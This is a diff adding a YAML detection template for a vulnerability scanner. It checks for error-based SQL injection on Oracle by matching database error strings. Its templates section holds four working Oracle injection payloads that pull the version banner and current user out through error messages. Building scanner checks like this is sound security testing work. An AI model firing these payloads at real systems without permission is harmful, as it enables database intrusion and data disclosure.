@@ -1,0 +1,71 @@
+id: "sqli-error-oracle"
+issue_code: "sql_injection"
+detection_condition: "or"
+detection_methods:
+  # Oracle-specific error patterns
+  - response_condition:
+      contains: "ORA-"
+      part: body
+      confidence: 95
+  - response_condition:
+      contains: "Oracle error"
+      part: body
+      confidence: 95
+  - response_condition:
+      contains: "Oracle Database"
+      part: body
+      confidence: 90
+  - response_condition:
+      contains: "PLS-"
+      part: body
+      confidence: 95
+  - response_condition:
+      contains: "SP2-"
+      part: body
+      confidence: 90
+  - response_condition:
+      contains: "quoted string not properly terminated"
+      part: body
+      confidence: 90
+  # Version extraction detection
+  - response_condition:
+      contains: "Oracle Database 1"
+      part: body
+      confidence: 95
+  - response_condition:
+      contains: "Oracle Database 2"
+      part: body
+      confidence: 95
+  - response_condition:
+      contains: "Release 1"
+      part: body
+      confidence: 70
+  - response_condition:
+      contains: "Release 2"
+      part: body
+      confidence: 70
+  # Generic database error fallback
+  - response_check:
+      check: "database_error"
+      confidence: 75
+launch:
+  operator: or
+  conditions:
+    - type: platform
+      value: oracle
+    - type: platform
+      value: java
+    - type: scan_mode
+      value: fuzz
+templates:
+  - "' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1))--"
+  - "1' AND 1=TO_NUMBER((SELECT user FROM dual))--"
+  - "') AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1))--"
+  - "'||(SELECT TO_CHAR(1/0) FROM dual)||'"
+categories:
+  - sql_injection
+  - error_based
+  - oracle
+platforms:
+  - oracle
+  - java
